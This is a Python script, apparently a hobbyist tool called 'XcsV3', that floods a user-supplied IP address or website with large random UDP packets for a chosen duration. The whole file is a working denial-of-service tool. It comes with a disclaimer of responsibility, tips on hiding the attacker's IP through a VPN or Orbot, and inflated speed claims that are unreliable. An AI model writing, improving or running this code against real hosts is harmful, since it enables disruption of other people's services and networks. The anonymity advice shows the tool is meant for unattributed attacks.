import socket
import random
import time
import colorama

from colorama import Fore, Back, Style

print("\n" * 100)

print(Fore.MAGENTA + Style.BRIGHT  + " ")
print("""
   |------------------------------|
   | 8888    8888  888888  888888 |
   |  8888  8888   88      88     |
   |   88888888    88      888888 |
   |  8888  8888   88          88 |
   | 8888    8888  888888  888888 |
   |-------------[V4]-------------|
""")

print(Fore.RED + Style.BRIGHT + "we aren't responsible to whatever thing you do using this tool, use it at your own risk.")
print(" ")
print(Fore.YELLOW + "Your ip is still visible, make sure your connected to a" + Fore.BLUE + " vpn.")
print(" ")
print(Fore.RED + "Example:  " + Fore.BLUE + "ip: 123.456.78.90 " + Fore.YELLOW + "Port: 80 (Default) " + Fore.RED + "Duration: As long as you want ")
print(" ")
print(Fore.BLUE + "Website DoS is Supported,       " + Fore.YELLOW + "Example:  ip: example.com")
print(" ")
print(Fore.MAGENTA + "DoS Speed: 15 - 20+ Mbps")
print("DDoS Speed: 250 - 300+ Mbps")
print(" ")
print(Style.BRIGHT + Fore.RED + "[!] " + Fore.YELLOW + "To get these fast DDoS & DoS Speeds make sure to use" + Fore.MAGENTA + Style.BRIGHT +  " Orbot" + Fore.YELLOW + "(from the playstore)")
print(" ")
print(Fore.RED + "[!] " + Fore.BLUE + "Tip: " + Fore.MAGENTA + "Open XcsV3 on all windows availble to get speeds around 1Gbps")
print(" ")
print(Fore.GREEN + "Made By Ultra")
print(Fore.RED + Style.BRIGHT + " ")
print(" ")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



bytes = random._urandom(65500)


ip = input('Target IP: ')
port = int(input(Fore.YELLOW + 'Port: '))

duration = input(Fore.GREEN + 'Number of seconds to send packets: ')
print(Fore.RED + Style.NORMAL +  " ")

timeout = time.time() + float(duration)

sent = 0



while True:

	if time.time() > timeout:

		break

	else:

		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1

	print(Fore.MAGENTA + "[+] " + Fore.RED + "XcsV3 " + Fore.GREEN + "Sent %s packet to %s through port %s"%(sent, ip, port))
